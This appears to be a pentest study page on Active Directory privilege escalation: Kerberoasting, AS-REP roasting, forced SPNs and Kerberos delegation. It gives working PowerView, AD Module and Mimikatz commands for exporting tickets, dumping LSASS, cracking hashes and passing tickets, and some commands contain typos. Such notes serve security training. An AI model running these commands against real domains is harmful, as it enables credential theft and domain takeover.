---
title: Domain Privilege Escalation
category: Active Directory
order: 4
---

Lets talk about some attacks to carry out a domain privilege escalation in order to obtain a Domain Controller.

# Attacking Kerberos

## Kerberoasting

The Kerberos session ticket as known as `TGS` has a server portion which is encrypted with the password hash of service account. This makes it possible to request a ticket and do offline password attack.

> **Note**: Service accounts are many times ignored. Password are rarely changed and have privileged access.


### Getting the TGS

First of all we need to find which users are used as *Service Accounts*:

* PowerView:
```powershell
Get-NetUser -SPN
```
* AD Module:
```powershell
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
```

After enum it, we need to request a TGS:

* PowerView:
```powershell
Request-SPNTicket
```

* AD Module:
```
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/mgmt-user.corp.local"
```

> **Note**: With `klist` you can check if the TGS has been granted.

Finally all tickets should be exported.

```powershell
Inovoke-Mimikatz -Command '"kerberos::list /export"'
```

### Cracking the tickets

Once the tickets are exported it can be cracked with `john`, `hashcat` or `tgsrepcrack.py` tool:

```
python.exe .\tgsrepcrack.py wordlist.txt ticket.kirbi
```
To crack the ticket with hascat exists a script to export it to a hashcat format.

* https://github.com/jarilaos/kirbi2hashcat

```
haschat -a 0 -m 13100 wordlist.txt ticket.txt
```

## AS-REP Roasting

If a users account does not have the flag _"Do not require Kerberos pre-authentication"_ in _UserAccountControl_ settings which means kerberos preauth is disabled, it is possible to grab users AS-REP and brute-force it offline.

### Users with No-Preauth set

We need to enumerate accounts with Kerberos Preauth disabled:

* PowerView:
```powershell
Get-DomainUser -PreauthNotRequired -Verbose
```

* AD Module:
```powershell
Get-ADUser -Filter {DoesNotRequiredPreAuth -eq $True} -Properties DoesNotRequiredPreAuth
```

> **Note**: With `GenericAll` or `GenericWrite`, kerberos preauth can be disabled.
> 
> `Set-DomainObject -Identity user01 -XOR @{useraccountcontrol=4194304} -Verbose`

### Cracking the tickets

We can request an encrypted AS-REP for offline brute-force. To do that task we can use `ASREPRoast` module:

```powershell
Import-Module ASREPRoast.ps1
Get-ASREPHash -UserName user01 -Verbose
```
After getting the ticket we can crack it with `john` or `hashcat`:

```
john user01.ticket --wordlist=wordlist.txt
hashcat -a 0 -m 18200 user01.ticket wordlist.txt
```

## Set SPN

With enough privileges such as `GenericAll` or `GenericWrite`, a target user's SPN can be set to anything which is unique in the domain. We can then request a TGS without special privileges and the TGS can be kerberoasted.

We can enumerate the permissions for a group on ACLs:

* PowerView (dev):
```powershell
Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentityReferenceName -match "RDPUsers"}
```

We can also see if a user already has a SPN:

* PowerView (dev):
```powershell
Get-DomainUser -Identity user01 | select serviceprincipalname
```
* AD Module:
```powershell
Get-ADUser -Identity user01 -Properties ServicePrincipalName | select ServicePrincipalName
```

And we can force the SPN to a user:

* PowerView (dev):
```powershell
Set-DomainObject -Identity user01 -Set @{serviceprincipalname='ops/whatever01'}
```

* AD Module:
```powershell
Set-ADUser -Identity user01 -ServicePrincipalNames @{Add='ops/whatever01'}
```

Once we have a SPN set, we can request a TGS:

```powershell
Add-Type -AssemblyName System.IdentityModel
New-Object Sytem.IdentityModel.Token.KerberosRequestorSecurityToken -ArgumentList "ops/whatever01"
```
And we can export the tickets to the disk:

```powershell
Inovoke-Mimikatz -Command '"kerberos::list /export"'
```
And finally same as *Kerberoasting*, you can crack the ticket with `tgsrepcrack.py`.

# Kerberos Delegation

_Kerberos Delegation_ allows to **reuse the end-user credentials** to access resources hosted on a different server. This is typically useful in multi-tier service or applications where Kerberos Double Hop is required.

For example, users authenticates to a web server and web server makes requests to a database server. The web server can request access to resources on the database server as the user and not as the web server's service account.

> **Note**: The service account for web service must be trusted for delegation to be able to make requests as a user. So the server can **Impersonate** the user.

There are two types of delegation:

## Unconstrained Delegation

When set for a particular service account, unconstrained delegation allows delegation to any service to any resource on the domain as a user.

When unconstrained delegation is enabled, the domain controller places uset's TGT inside TGS. When that is presented to the server with unconstrained delegation, the TGT is extracted from TGS and sotred in LSASS. This way the server can reuse the user's TGT to access any other resource as the user.

> **Note**: Allows the first hop server to request access to **any service** on **any computer** in the domain.

We need to discover computers which have **unconstrained delegation** enabled.

* PowerView:
```powershell
Get-NetComputer -UnConstrained
```
* AD Module:
```powershell
Get-ADComputer -Filter {TrustedForDelegation -eq $True}
Get-ADUser -Filter {TrustedForDelegation -eq $True}
```
> **Note**: The **DC** always have the unconstrained delegation **enabled**.

To exploit the unconstrained delgation and extract the user's TGT from lsass, we need to compromise the server as local admin.

```powershell
Invoke-Mimikatz -Command '"sekurlsa::tickets /export"'
```
If any interesting ticket is located on the server, we will need to wait until a interesting user connects to the compromised server. We can use `Invoke-UserHunter` to see if the targeted user connects to the server:

```powershell
Invoke-UserHunter -ComputerName srv01 -Poll 100 -UserName Administrator -Delay 5 -Verbose
```

If we find a interesting ticket, it could be reused using _PassTheTicket_:

```powershell
Invoke-Mimikatz -Command '"kerberos::ptt ticket.kirbi"'
```

## Constrained Delegation

When Contrained Delegation is enabled on a service account, allows access only to specified services on specified computers as a user.

A typical scenario where constrained delegation is userd is where a user authenticates to a web service without using Kerberos and the web service makes requests to a database server to fetch results based on the user's authorization.

> **Note**: Allows the first hop server to request access only to **specified services** on **specified computers**. 

To impersonate the user, Service for user as known as `S4U` extension is used which provides two extensions:

* **Service for User to Self (S4U2self)**: Allows a service to obtain a forwardable TGS to itself on behalf a user.

* **Service for User to Proxy (S4U2proxy)**: Allows a service to obtain a TGS to a second service on behalf of a user.

